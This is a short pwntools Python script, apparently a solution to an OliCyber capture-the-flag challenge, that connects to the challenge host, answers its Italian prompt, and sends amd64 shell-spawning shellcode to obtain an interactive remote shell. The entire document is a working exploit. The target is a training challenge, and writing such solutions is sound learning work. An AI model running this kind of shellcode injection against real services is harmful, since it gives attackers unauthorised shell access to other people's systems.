from pwn import *
host = "software-20.challs.olicyber.it"
port = 13003

r = remote(host, port)
r.sendafter(b"carattere per iniziare ...",b"y")
asm_code = shellcraft.amd64.linux.sh()
lines = asm_code.split("\n")
r.sendline(b'48')
print(r.recvuntil(b'bytes:'))
shellcode = asm(asm_code, arch='x86_64')
r.sendline(shellcode)
r.interactive()

